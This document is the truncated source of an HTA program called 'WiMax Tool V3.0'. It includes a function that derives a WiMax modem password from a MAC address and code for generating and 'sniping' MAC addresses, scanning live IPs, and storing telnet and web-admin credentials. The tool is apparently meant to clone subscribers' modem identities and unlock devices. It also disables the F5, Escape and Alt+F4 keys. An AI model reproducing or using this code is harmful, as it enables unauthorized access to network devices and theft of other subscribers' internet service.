<html>
<head>
<script language="javascript" type="text/javascript">
var add=[12,2,17,5,16,31,28,10,16,20,22,1];
var subst={58:122,59:121,60:120,61:119,62:118,63:117,64:116,91:115,92:114,93:113,94:112,45:111,96:110};
function doMath(hexValue1,hexValue2) {
var outHex;
var stringHex1 = parseInt(hexValue1,16); 
var stringHex2 = parseInt(hexValue2,16); 
var number = stringHex1; 
var number2 = stringHex2; 
var hexaddansv = eval(number) + eval(number2);
outHex = (hexaddansv); 
return outHex = Number(hexaddansv).toString(16);
}
function SubdoMath(hexValue1,hexValue2) {
var outHex;
var stringHex1 = parseInt(hexValue1,16); 
var stringHex2 = parseInt(hexValue2,16); 
var number = stringHex1;
var number2 = stringHex2;
var hexaddansv = eval(number) - eval(number2);
outHex = (hexaddansv); 
return outHex = Number(hexaddansv).toString(16); 
}
function RandomNumInc(numberRange) {
var result;
var maxNum;
maxNum = numberRange
return result = Math.floor((Math.random()*maxNum)+1); 
}
function checkGreaterThan(hexValue1a,hexValue2a) {
var isGreaterThan;
isGreaterThan = false;
var stringHex1a = parseInt(hexValue1a,16); 
var stringHex2a = parseInt(hexValue2a,16); 
var number = stringHex1a; 
var number2 = stringHex2a; 
if (number < number2)
{
isGreaterThan = true;
}
return isGreaterThan;
}
function checkMacAddressValid(input){
var inputMac=input.replace(/:/g,"").toUpperCase();
var macPassword="";
if((inputMac.search(/^[A-F0-9]{12}$/)==-1) || (inputMac =="000000000000")){
return macPassword="invalid"};
else{
return macPassword="valid";
}
}
function document.onkeydown() {  
var alt=window.event.altKey;
if (event.keyCode==116 || event.keyCode==27 || alt && event.keyCode==115) {
event.keyCode=0; 
event.cancelBubble=true; 
return false; 
}
} 
function generatePassword(input){
var inputMac=input.replace(/:/g,"").toUpperCase();
var macPassword="";
if((inputMac.search(/^[A-F0-9]{12}$/)==-1) || (inputMac =="000000000000")){
return macPassword="invalid";
}
else{
var b;
var a;
var c="";
for(b=0;b<12;b++){
a=inputMac.charCodeAt(b)+add[b];
if(subst[a]){
a=subst[a];
}
c+=String.fromCharCode(a);
}
return macPassword="2008"+c+"";
}
}     
var base64EncodeChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
var base64DecodeChars = new Array(
-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,
52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1,
-1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1,
-1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);
function base64encode(str) {
var out, i, len;
var c1, c2, c3;
len = str.length;
i = 0;
out = "";
while(i < len) {
c1 = str.charCodeAt(i++) & 0xff;
if(i == len)
{
out += base64EncodeChars.charAt(c1 >> 2);
out += base64EncodeChars.charAt((c1 & 0x3) << 4);
out += "==";
break;
}
c2 = str.charCodeAt(i++);
if(i == len)
{
out += base64EncodeChars.charAt(c1 >> 2);
out += base64EncodeChars.charAt(((c1 & 0x3)<< 4) | ((c2 & 0xF0) >> 4));
out += base64EncodeChars.charAt((c2 & 0xF) << 2);
out += "=";
break;
}
c3 = str.charCodeAt(i++);
out += base64EncodeChars.charAt(c1 >> 2);
out += base64EncodeChars.charAt(((c1 & 0x3)<< 4) | ((c2 & 0xF0) >> 4));
out += base64EncodeChars.charAt(((c2 & 0xF) << 2) | ((c3 & 0xC0) >>6));
out += base64EncodeChars.charAt(c3 & 0x3F);
}
return out;
}
function base64decode(str) {
var c1, c2, c3, c4;
var i, len, out;
len = str.length;
i = 0;
out = "";
while(i < len) {
do {
c1 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
} while(i < len && c1 == -1);
if(c1 == -1)
break;
do {
c2 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
} while(i < len && c2 == -1);
if(c2 == -1)
break;
out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));
do {
c3 = str.charCodeAt(i++) & 0xff;
if(c3 == 61)
return out;
c3 = base64DecodeChars[c3];
} while(i < len && c3 == -1);
if(c3 == -1)
break;
out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));
do {
c4 = str.charCodeAt(i++) & 0xff;
if(c4 == 61)
return out;
c4 = base64DecodeChars[c4];
} while(i < len && c4 == -1);
if(c4 == -1)
break;
out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
}
return out;
}
function IpDot2num(dot) {
var d = dot.split('.');
return ((((((+d[0])*256)+(+d[1]))*256)+(+d[2]))*256)+(+d[3]);}
function IpNum2dot(num) {
var d = num%256;
for (var i = 3; i > 0; i--) {
num = Math.floor(num/256);
d = num%256 + '.' + d;}
return d;}
</script>
<title>WiMax Tool V3.0 [Script by: yyyxyyyz]</title>
<HTA:APPLICATION
APPLICATIONNAME="yyyxyyyz"
ID="yyyxyyyz"
VERSION=".01"
BORDER="thin"
MAXIMIZEBUTTON="no"
SCROLL="no"
SINGLEINSTANCE="yes"
CONTEXTMENU="no"/>  
</head>
<SCRIPT Language="VBScript">
macDefaultValue = "00:1E:10:F4:DB:00" ''"00:22:33:44:55:FE"
baseMac = Mid(mac,1,15)
sub onLoad()
If CheckTelnetAccountFile Then
document.GetElementById("panel1").style.display = "block"
document.GetElementById("panelSub1").style.display = "block"
Else
document.GetElementById("panel5").style.display = "block"	
selPanel(5)
End If
selPanelSub(1)
selPanelSubTelnet(1)
PopulateWebAccount
PopulateMyDefaultMac
end Sub 
sub selPanel(number)
i = 1
do while i <= 6
if i = number then
document.GetElementById("panel" & Cstr(i)).style.display = "block"
document.GetElementById("tab" & Cstr(i)).className = "tabs tabs1"
else
document.GetElementById("panel" & Cstr(i)).style.display = "none"
document.GetElementById("tab" & Cstr(i)).className = "tabs tabs0"
end if
i = i + 1
Loop
end Sub
sub selPanelSub(numberx)
x = 1
do while x <= 2
if x = numberx then
document.GetElementById("panelSub" & Cstr(x)).style.display = "block"
document.GetElementById("tabSub" & Cstr(x)).className = "tabs tabs1"
else
document.GetElementById("panelSub" & Cstr(x)).style.display = "none"
document.GetElementById("tabSub" & Cstr(x)).className = "tabs tabs0"
end if
x = x + 1
loop
end Sub
''
Sub selPanelSubTelnet(numbery)
'Sleeper 100
y = 1
do while y <= 3
if y = numbery then
document.GetElementById("panelSubTel" & Cstr(y)).style.display = "block"
document.GetElementById("tabSubTel" & Cstr(y)).className = "tabs tabs1"
else
document.GetElementById("panelSubTel" & Cstr(y)).style.display = "none"
document.GetElementById("tabSubTel" & Cstr(y)).className = "tabs tabs0"
end if
y = y + 1
Loop
y=0
End sub
''
Sub Window_Onload 
Dim width,height
width=475
height = 590
self.ResizeTo width,height
self.MoveTo (screen.AvailWidth-width)/2,(screen.AvailHeight-height)/2
InputacAddress.value = macDefaultValue
InputMacToGenPassword.value = macDefaultValue
genMacButton.Disabled = True
addMacButton.Disabled = True
btnStartIpScan.Disabled = True
''btnWebGUI.Disabled = True
RestoreOptionSnipeWarning.style.display = "none"
document.all.chkAllowNaiLabel.style.background = "Red"
document.all.chkEnable622mTypeLabel.style.background = "Red"
document.all.chkAllowNaiSnipeLabel.style.background = "Red"
document.all.chkIncDecLabel.style.background = "Red"
document.all.chkDonotTestAllLabel.style.background = "Red"
document.all.chkEnablePersistentSnipeLabel.style.background = "Red"
''if bm622 ''NOT Read due to function SelectDeviceOptionRadioBtnClick w/c on winload the radio default is checked
'		If radiobtnBm622.Checked Then
'radioBtnReboot.Checked = False
'radioBtnRestore.Checked = True
'ChangingMacButtonOption
''snipeOption
'		End If
''end bm622
'ReadFile    
'iTimerID = window.setInterval("VBScript:ReadFile", 5000)
''IE9issuefix
''iTimerBlinkID = window.setInterval("VBScript:BlinkThisWhite", 1100)
''iTimerBlinkRedID = window.setInterval("VBScript:BlinkThisRed", 3100)
populateListOfGenMac
populateListOfLiveMac
populateCurrentLiveIpScan
PopulateMySystem
''leave this alone to check if file is not created
CheckDeadMacListFile
changeMacOneOnly.Disabled = True
btnWebAdmin.Disabled = True
btnWebGUI.Disabled = True
btnSetFrequency.Disabled = True
DisableSecuritySettingsElement
ClearTstCmndInOut
SnipeBtn.Disabled = EnableDisableSnipButton
PopulateTestTryAndSpeedSettings
PopulateTelnetAccount
InstallMyAutoItFile
'	CreateObject("WScript.Shell").Run "REGSVR32 AutoItX3.dll /s",0 , false
'	CreateTableandPopulateWithGenMacFile

End Sub   'end windows load
Sub BlinkThisWhite
blinkThisText.style.color = "White"
'blinkThisText.style.background = "Transparent"
'If blinkThisText.innerhtml = "" Then
'blinkThisText.innerhtml = "This process is REQUIRED!!! ONE time process only!!!"
'Else 
'blinkThisText.innerhtml = ""
'End if
'InputacAddress.Value =""
'InputacAddress.style.color = "#000000"
End Sub
Sub BlinkThisRed
blinkThisText.style.color = "Red" '#330000
End Sub
Sub RegAutoItDLL
''ExecuteDLL "REGSVR32","AutoItX3.dll","install"
set winsh = CreateObject("WScript.Shell")
set winenv = winsh.Environment("Process")
windir = winenv("SYSTEMROOT")
intAnswer = Msgbox ("WARNING : Before you continue."  & vbCr & vbLf & vbCr & vbLf & "Question: Is YOUR O.S is 64 bit??? "& vbCr & vbLf  & vbCr & vbLf & "Click [ YES ] If YOUR O.S is 64 bit. "& vbCr & vbLf &  "Click [ NO ] if YOUR O.S is 32 bit. ", vbYesNo, "Confirmation Message...")
If intAnswer = vbYes Then
MsgBox "You select O.S. 64 bit. Registering DLL for 64 bit.",,"Notification Message...."
ExecuteDLL windir & "\SysWOW64\REGSVR32","AutoItX3_x64.dll","install"
ElseIf intAnswer = vbNo Then
MsgBox "You select O.S. 32 bit. Registering DLL for 32 bit.",,"Notification Message...."
ExecuteDLL "REGSVR32","AutoItX3.dll","install"
End If
''
End Sub
Sub RegAutoItDLL_orig
''CreateObject("WScript.Shell").Run "regDLL.bat",0, False
Set FSO = CreateObject("Scripting.FileSystemObject")
currentFolder = FSO.GetParentFolderName(location.pathname)
''MsgBox currentFolder &"\"
Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute "REGSVR32", currentFolder &"\AutoItX3.dll", currentFolder, "runas", 1
'CreateObject("WScript.Shell").Run "REGSVR32 AutoItX3.dll ",1 , True
MsgBox "After pressing OK button. Please TEST the DLL using TEST DLL button. Thank You!",64, "Warning Message"
End Sub
Sub UnregAutoItDLL
''ExecuteDLL "REGSVR32","AutoItX3.dll","uninstall"
set winsh = CreateObject("WScript.Shell")
set winenv = winsh.Environment("Process")
windir = winenv("SYSTEMROOT")
intAnswer = Msgbox ("WARNING : Before you continue."  & vbCr & vbLf & vbCr & vbLf & "Question: Is YOUR O.S is 64 bit??? "& vbCr & vbLf  & vbCr & vbLf & "Click [ YES ] If YOUR O.S is 64 bit. "& vbCr & vbLf &  "Click [ NO ] if YOUR O.S is 32 bit. ", vbYesNo, "Confirmation Message...")
If intAnswer = vbYes Then
MsgBox "You select O.S. 64 bit. Removing DLL for 64 bit.",,"Notification Message...."
ExecuteDLL windir & "\SysWOW64\REGSVR32","AutoItX3_x64.dll","uninstall"
ElseIf intAnswer = vbNo Then
MsgBox "You select O.S. 32 bit. Removing DLL for 32 bit.",,"Notification Message...."
ExecuteDLL "REGSVR32","AutoItX3.dll","uninstall"
End If
''
End Sub
Sub UnregAutoItDLL_orig
Set objShellInGen = CreateObject("WScript.Shell")
ansBtn = objShellInGen.Popup("WARNING : NOT RECOMMENDED!!!."& vbCr & vbLf & "Some features of this Tool will STOP functioning."& vbCr & vbLf  &"Like: MAC SNIPE and CHANGING of domain"& vbCr & vbLf  & vbCr & vbLf &"[OK] = CONTINUE NOW! " & vbCr & vbLf & "[Cancel] = ABORT!", 0, "Warning message...", 1 + 4096 + 16)
If (ansBtn = -1 OR ansBtn = 1)  Then
'				changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Operation started..."
'				TextAreaScrollBottom(changeMACLog.name)
Else 
'				changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Operation cancelled..."
'				TextAreaScrollBottom(changeMACLog.name)
Exit Sub
End If
Set objShellInGen = Nothing
Set ansBtn = Nothing
'CreateObject("WScript.Shell").Run "unregDLL.bat",0, False
Set FSO = CreateObject("Scripting.FileSystemObject")
currentFolder = FSO.GetParentFolderName(location.pathname)
''MsgBox currentFolder &"\"
Set objShell = CreateObject("Shell.Application")
If IsWindowsXp Then
objShell.ShellExecute "REGSVR32", currentFolder &"\AutoItX3.dll /u", currentFolder, "", 1
Else
objShell.ShellExecute "REGSVR32", currentFolder &"\AutoItX3.dll /u", currentFolder, "runas", 1
End If

'CreateObject("WScript.Shell").Run "REGSVR32 AutoItX3.dll  /u ",1 , false
End Sub
Sub TestAutoItDLL
MsgBox "NOTE: If you did not READ the text CONGRATULATIONS means you FAILED to INSTALL DLL!!!",,"Notification Message...."
ExecuteDLL "wscript","TestAutoITPlugin.vbs","testPlugin"

End Sub
Sub TestAutoItDLL_orig
Msgbox "CLOSE ALL NOTEPAD FIRST. After you press OK button."  & vbCr & vbLf &  "If you did not READ the SUCCESS TEXT. "& vbCr & vbLf & "It means you FAILED!!! to REGISTER the DLL!!!"& vbCr & vbLf & "Then try this TOOL to run as ADMIN...",64,"Test result Notification"
''CreateObject("WScript.Shell").Run "TestAutoITPlugin.vbs",0 , False
Set FSO = CreateObject("Scripting.FileSystemObject")
currentFolder = FSO.GetParentFolderName(location.pathname)
''MsgBox currentFolder &"\"
Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute "cscript", currentFolder &"\TestAutoITPlugin.vbs", currentFolder, "", 0
End Sub
Function EnableDisableSnipButton
'SnipeBtn
Set fso = CreateObject("Scripting.FileSystemObject")
disableBTn = False
filename = "MacGenList.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
If fso.FileExists(textFilePath)= True Then
If fso.GetFile(textFilePath).size <> 0 then
disableBTn = False
Else
'MsgBox "File is EMPTY!"
disableBTn = True
End if
Else
'MsgBox "File NOT EXIST"
disableBTn = True
End If
' PopulateTelnetAccount	
EnableDisableSnipButton = disableBTn
End Function
''
Sub CreateWimaxWebAccount
webUserUname = Trim(inputWebUserUname.value)
webUserPassword = Trim(inputWebUserPassowrd.value)
''
webAdminUname = Trim(inputWebAdminUname.value)
webAdminPassword = Trim(inputWebAdminPassowrd.value)

webUserOption = SelectWebAccountOptionRadioBtnClick
webAdminOption = SelectWebAdminAccountOptionRadioBtnClick
''accountFile= "WimaxAccount.txt"
filename = "WimaxWebAccount.txt"
accountFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(accountFile)= False Then
Set objOutputFile = fso.CreateTextFile(accountFile,True)
objOutputFile.Write webUserUname & "|" & webUserPassword & "|" & webUserOption & "|" & webAdminUname & "|" & webAdminPassword & "|" & webAdminOption
objOutputFile.Close
MsgBox "Wimax Web Account created...",48+4096,"Notification"
Else
Const ForWriting = 2
Set objOutputFile = fso.OpenTextFile(accountFile, ForWriting)
objOutputFile.Write webUserUname & "|" & webUserPassword & "|" & webUserOption & "|" & webAdminUname & "|" & webAdminPassword & "|" & webAdminOption
objOutputFile.Close
MsgBox "Wimax Web Account change...",48+4096,"Notification"
End If
''PopulateTelnetAccount	
PopulateWebAccount
''MsgBox "success"
End Sub
''
''begin populatewebaccount
Sub PopulateWebAccount
''accountFile= "WimaxWebAccount.txt"
filename = "WimaxWebAccount.txt"
accountFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(accountFile)= True Then
Set objFileToRead = CreateObject("Scripting.FileSystemObject").OpenTextFile(accountFile,1)
strFileText = objFileToRead.ReadLine()
objFileToRead.Close
Set objFileToRead = Nothing
MyString = (Trim(strFileText))
MyArray = Split(MyString, "|", -1, 1)
sUsernameUser = MyArray(0) 
sPasswordUser = MyArray(1)
sOptionUser = MyArray(2)
sUsernameAdmin = MyArray(3) 
sPasswordAdmin = MyArray(4)
sOptionAdmin = MyArray(5)
inputWebUserUname.value = Trim(sUsernameUser)
inputWebUserPassowrd.value = Trim(sPasswordUser)
inputWebAdminUname.value = Trim(sUsernameAdmin)
inputWebAdminPassowrd.value = Trim(sPasswordAdmin)
If sOptionUser = "Webuserdef" Then
radiobtnWebUserDef.Checked = True
radiobtnWebUserDef.Click
ElseIf sOptionUser = "Webusercus" Then
radiobtnWebUserCus.Checked = True
radiobtnWebUserCus.Click
End if
If sOptionAdmin = "Webadmindef" Then
radiobtnWebAdminDef.Checked = True
radiobtnWebAdminDef.Click
ElseIf sOptionAdmin = "Webadmincus" Then
radiobtnWebAdminCus.Checked = True
radiobtnWebAdminCus.Click
End if
Else
radiobtnWebUserDef.Checked = True
radiobtnWebUserDef.Click
radiobtnWebAdminDef.Checked = True
radiobtnWebAdminDef.Click
'MsgBox "IMPORTANT:Before using the functions  of this tool." & vbCr & vbLf & "Please Fill-up the telnet account in the TELNET ACCOUNT TAB." & vbCr & vbLf & "DO NOT FORGET TO SAVE SETTINGS!!!" ,16+4096,"IMPORTANT NOTICE!!!"
'changeMACLog.value = "IMPORTANT:Before using the functions  of this tool." & vbCr & vbLf & "Please Fill-up the telnet account in the TELNET ACCOUNT TAB." & vbCr & vbLf & "DO NOT FORGET TO SAVE SETTINGS!!!"
'TextAreaScrollBottom(changeMACLog.name)
End If
End Sub
''end populatewebaccount
''checkwebaccount
Function CheckWebAccountFile
result = false
''accountFile= "WimaxWebAccount.txt"
filename = "WimaxWebAccount.txt.txt"
accountFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(accountFile)= False Then
result = False
Else
result= True
End If
CheckWebAccountFile = result
End Function
''end checkwebaccount
''begin createDefaultMAc
Sub CreateDefaultMacFile
''MsgBox CheckMyDefaultMacIsValid
If CheckMyDefaultMacIsValid = False Then
Exit Sub
End If
myMac = inputDefaultMAC.value
myMacDomain = drpDwnDefaultMacDomain.value
myMacPass = inputDefaultMACPassword.value
myTLSDef = 0
myAllowNaiDef = 0
myBootMethod = 0
If chkEnableTLSDef.Checked Then
myTLSDef = 1
End If
If chkAllowNaiDef.Checked Then
myAllowNaiDef = 1
End If
If chkEnableRestore.Checked Then
myBootMethod = 1
End If

''deviceModel = SelectDeviceOptionRadioBtnClick
''accountFile= "WimaxAccount.txt"
filename = "MyDefaultMac.txt"
accountFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(accountFile)= False Then
Set objOutputFile = fso.CreateTextFile(accountFile,True)
objOutputFile.Write myMac & "|" & myMacDomain & "|" & myMacPass & "|" & myTLSDef & "|" & myAllowNaiDef& "|" & myBootMethod
objOutputFile.Close
MsgBox "SUCCESS: My default MAC created...",48+4096,"Notification"
Else
Const ForWriting = 2
Set objOutputFile = fso.OpenTextFile(accountFile, ForWriting)
objOutputFile.Write  myMac & "|" & myMacDomain & "|" & myMacPass & "|" & myTLSDef & "|" & myAllowNaiDef& "|" & myBootMethod
objOutputFile.Close
MsgBox "SUCCESS: My default MAC change...",48+4096,"Notification"
End If
''PopulateTelnetAccount	
PopulateMyDefaultMac
End Sub
''end createDefaultMAc
''begin populateDefaultMAC
Sub PopulateMyDefaultMac
''accountFile= "WimaxAccount.txt"
filename = "MyDefaultMac.txt"
accountFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(accountFile)= True Then
Set objFileToRead = CreateObject("Scripting.FileSystemObject").OpenTextFile(accountFile,1)
strFileText = objFileToRead.ReadLine()
objFileToRead.Close
Set objFileToRead = Nothing
MyString = (Trim(strFileText))
MyArray = Split(MyString, "|", -1, 1)
sMyMac = MyArray(0) 
sMyMacDomain = MyArray(1)
sMyMacUserIdPass = MyArray(2)
sMyTLSDef = CInt(MyArray(3))
sMyAllowNaiDef = CInt(MyArray(4))
sMyBootMethod = CInt(MyArray(5))

If sMyTLSDef = 1  Then
chkEnableTLSDef.Checked = True
document.all.chkEnableTLSLabelDef.style.background = "Red"
Else
chkEnableTLSDef.Checked = False
document.all.chkEnableTLSLabelDef.style.background = ""
End If
If sMyAllowNaiDef = 1  Then
chkAllowNaiDef.Checked = True
document.all.chkAllowNaiLabelDef.style.background = "Red"
Else
chkAllowNaiDef.Checked = False
document.all.chkAllowNaiLabelDef.style.background = ""
End If
If sMyBootMethod = 1  Then
chkEnableRestore.Checked = True
document.all.chkEnableLabelRestore.style.background = "Red"
Else
chkEnableRestore.Checked = False
document.all.chkEnableLabelRestore.style.background = ""
End If
inputDefaultMAC.value = sMyMac

set objSelectIdDomainDef = document.getElementById("drpDwnDefaultMacDomain")
for i = 0 to objSelectIdDomainDef.length ''for i = 0 to objSelect.length - 2
'msgbox objSelect.options(i).value
If objSelectIdDomainDef.options(i).value = sMyMacDomain   Then
drpDwnDefaultMacDomain.selectedIndex = i
Exit for
End if
Next
inputDefaultMACPassword.value = sMyMacUserIdPass
drpDwnDefaultMacDomain.Disabled = False
inputDefaultMACPassword.Disabled = False
btnPasteDefaultMacPassword.Disabled = False
btnChangeMacDefault.Disabled = False
btnSaveMacDefault.Disabled = False
btnLoadDefaultMacPassword.Disabled = False
Else
drpDwnDefaultMacDomain.Disabled = True
inputDefaultMACPassword.Disabled = True
btnPasteDefaultMacPassword.Disabled = True
btnChangeMacDefault.Disabled = True
btnSaveMacDefault.Disabled = True
btnLoadDefaultMacPassword.Disabled = True

'MsgBox "IMPORTANT:Before using the functions  of this tool." & vbCr & vbLf & "Please Fill-up the telnet account in the TELNET ACCOUNT TAB." & vbCr & vbLf & "DO NOT FORGET TO SAVE SETTINGS!!!" ,16+4096,"IMPORTANT NOTICE!!!"
'changeMACLog.value = "IMPORTANT:Before using the functions  of this tool." & vbCr & vbLf & "Please Fill-up the telnet account in the TELNET ACCOUNT TAB." & vbCr & vbLf & "DO NOT FORGET TO SAVE SETTINGS!!!"
'TextAreaScrollBottom(changeMACLog.name)
End If
End Sub
''end populateDefaultMAC
''
''Begin testSettings
Sub PopulateTestTryAndSpeedSettings
''accountFile= "WimaxAccount.txt"
filename = "TestTryAndSpeedSettings.txt"
accountFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(accountFile)= True Then
Set objFileToRead = CreateObject("Scripting.FileSystemObject").OpenTextFile(accountFile,1)
strFileText = objFileToRead.ReadLine()
objFileToRead.Close
Set objFileToRead = Nothing
MyString = (Trim(strFileText))
MyArray = Split(MyString, "|", -1, 1)
sSnipe = MyArray(0) 
sPhoneFul = MyArray(1)
MyArrayPHone = Split(sPhoneFul, "-", -1, 1)
sLiveIp = MyArrayPHone(0)
inputPhone.value = MyArrayPHone(1)
sFileSize = MyArray(2)
sAutoCheckUpdate = MyArray(3)
set objSelectIdSnipeTryList = document.getElementById("snipeTryList")
for i = 0 to objSelectIdSnipeTryList.length ''for i = 0 to objSelect.length - 2
'msgbox objSelect.options(i).value
If objSelectIdSnipeTryList.options(i).value = sSnipe   Then
snipeTryList.selectedIndex = i
Exit for
End if
Next
snipeTryList.Disabled = False
set objSelectIdLiveIPTryList= document.getElementById("liveIPTryList")
for i = 0 to objSelectIdLiveIPTryList.length ''for i = 0 to objSelect.length - 2
'msgbox objSelect.options(i).value
If objSelectIdLiveIPTryList.options(i).value = sLiveIp   Then
liveIPTryList.selectedIndex = i
Exit for
End if
Next
liveIPTryList.Disabled = False
set objSelectIdFileSizeList = document.getElementById("fileSizeList")
for i = 0 to objSelectIdFileSizeList.length ''for i = 0 to objSelect.length - 2
'msgbox objSelect.options(i).value
If objSelectIdFileSizeList.options(i).value = sFileSize   Then
fileSizeList.selectedIndex = i
Exit for
End if
Next
fileSizeList.Disabled = False
If sAutoCheckUpdate = 1  Then
chkAutoCheckUpdate.Checked = True
document.all.chkAutoCheckUpdateLabel.style.background = "Green"
Else
chkAutoCheckUpdate.Checked = False
End If
End If

End Sub
''
Sub RunUpdateOnToolOk
If chkAutoCheckUpdate.Checked Then
MsgBox "TOOL is now CHECKING for latest update. Please WAIT...", 64+4096 , "Automatic CHECK TOOL Update is ENABLED...."
DisplayLogChangeMAConly("Checking tool update is now running.. please WAIT....")
RunUpdateOnToolOkFinal(1)
Else
DisplayLogChangeMAConly("Automatic CHECKING for latest update is DISABLED.")
End If
End Sub
''
Sub RunUpdateOnToolOkFinal(typeInput)

hostToPing = "www.google.com"
If PingCheckInternet(hostToPing)Then
''Msgbox	updateRunUpdateChecker , 64+4096 , "Automatic CHECK Update ENABLED...."
MyString = (Trim(updateRunUpdateChecker))
MyArray = Split(MyString, ":", -1, 1)
'		toolVersion = MyArray(0)
'		toolTypeCode = MyArray(1)
'		toolType = MyArray(2)
'		toolBy = MyArray(3)
If MyArray(1) = "pulic102" Then
ProtocolTesting
Exit Sub
End if
If  MyArray(0) <> VersionAboutTool  Then
If toolVersion  <> "No_Update" Then
If typeInput = 1 Then
DisplayLogChangeMAConly("Cheking for NEW tool update is FINISHED.....")
MsgBox "TOOL UPDATE is NOW available!!! New Release Version: " & MyArray(0) &" " & MyArray(2) &" By: " & MyArray(3), 64+4096 , "Update Result....by: " &MyArray(3)
End If
Else 
If typeInput = 1 Then
DisplayLogChangeMAConly("Cheking for NEW tool update is FINISHED.....")
MsgBox "Sorry, NO Updates Available. "& MyArray(2) &" By: " & MyArray(3), 64+4096 , "Update Result....by: " &MyArray(3)
End If
End If

Else
If typeInput = 1 Then
DisplayLogChangeMAConly("Cheking for NEW tool update is FINISHED.....")
MsgBox "Congrats!!! your TOOL version is up to date.... Version: " & VersionAboutTool &" " & MyArray(2) &" By: " & MyArray(3) , 64+4096 , "Update Result.... by: " &MyArray(3)
End If 
End If
Else
If typeInput = 1 Then
DisplayLogChangeMAConly("Cheking for NEW tool update is FINISHED.....")
Msgbox "ERROR: Cannot check TOOL update. Please check your Internet Connection." , 64+4096 , "Automatic CHECK TOOL Update is ENABLED...."
End If 
End If
End Sub
''
Sub CreateTestTryAndSpeedSettings
mySnipe = snipeTryList.value
myNumber = Trim(inputPhone.value)
myPrefixNum = liveIPTryList.value
myLiveIp = ""
''
If Len(myNumber) = 7 Then
If IsNumeric(myNumber) Then
'' Here, it still could be an integer or a floating point number
'	    If CLng(myNumber) = myNumber Then
'	    	myLiveIp = myPrefixNum &"-" & myNumber
'	    Else
'	    	MsgBox "Invalid Phone Number"
'	       	Exit Sub
'	    End If
myLiveIp = myPrefixNum &"-" & myNumber
Else
MsgBox "Invalid Phone Number"
Exit Sub
End If
Else
MsgBox "Invalid Phone Number"
Exit Sub
End If
If myLiveIp = "" Then
MsgBox "Invalid Phone Number"
Exit Sub
End If
''
myFileSize = fileSizeList.value
myAutoCheckUpdate = 0
If chkAutoCheckUpdate.Checked Then
myAutoCheckUpdate = 1
End If
filename = "TestTryAndSpeedSettings.txt"
testCreateFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(testCreateFile)= False Then
Set objOutputFile = fso.CreateTextFile(testCreateFile,True)
objOutputFile.Write mySnipe & "|" & myLiveIp & "|" & myFileSize & "|" & myAutoCheckUpdate 
objOutputFile.Close
MsgBox "Test Settings created...",48+4096,"Notification"
Else
Const ForWriting = 2
Set objOutputFile = fso.OpenTextFile(testCreateFile, ForWriting)
objOutputFile.Write mySnipe & "|" & myLiveIp & "|" & myFileSize & "|" & myAutoCheckUpdate 
objOutputFile.Close
MsgBox "Test Settings change...",48+4096,"Notification"
End If
PopulateTestTryAndSpeedSettings
End Sub
''END testSettings
''
''begin of saveLastIPScan
Sub CreateSaveLastIpScan(lastScanIp)
startIP = lastScanIp ''InputStartIp.value
LastIP = InputEndIp.value 
If startIP >= InputEndIp.value Then
LastIP = IncIp(InputEndIp.value)
LastIP = IncIp(LastIP)
End If 

filename = "LastIpScanned.txt"
accountFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(accountFile)= False Then
Set objOutputFile = fso.CreateTextFile(accountFile,True)
objOutputFile.Write startIP & "|" & LastIP
objOutputFile.Close
DisplayLogIpscan "Next IP to be scan is saved...."
Else
Const ForWriting = 2
Set objOutputFile = fso.OpenTextFile(accountFile, ForWriting)
objOutputFile.Write startIP & "|" & LastIP
objOutputFile.Close
DisplayLogIpscan "Next IP to be scan is saved..."
End If
''PopulateTelnetAccount	
End Sub
''end of lastIPScan
''begin of mySystemInfo
Function getAdapterName
adapterName = "NotFound"
        For Each objOption in drpDwnNetAdapter.Options
            If objOption.Selected Then
                adapterName = objOption.InnerText
            End If
        Next
getAdapterName = adapterName
End Function
    ''
Sub CreateMySystemInfo
If drpDwnNetAdapter.value = "emptylist" Then
MsgBox "ERROR: You did not select your Network Adapter (LAN/WAN).!!(REQUIRED!!!)",16+4096,"ERROR: SELECT your CORRECT LAN/WLAN....."
Exit Sub
ElseIf drpDwnNetAdapter.value = "" Then
